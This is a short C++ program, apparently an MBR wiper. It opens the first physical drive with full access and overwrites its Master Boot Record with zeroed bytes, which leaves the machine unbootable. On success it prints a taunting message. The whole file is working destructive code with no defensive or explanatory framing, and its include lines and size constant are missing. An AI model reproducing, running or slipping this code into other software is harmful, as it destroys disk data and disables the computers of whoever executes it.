// Author : AitorFirmware


using namespace std;

int main()
{
    DWORD write;
    char mbrData[MBR_SIZE];
    bzero(&mbrData, MBR_SIZE);
    HANDLE MBR = CreateFile(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL
    );
    if (WriteFile(MBR, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
        // success
        cout << "[!] Neuro Compatibilidad !";
    }
    else {
        // failed
        cout << "[-] MBR OverWrite Failed !";
    }
    CloseHandle(MBR);
    return EXIT_SUCCESS;
}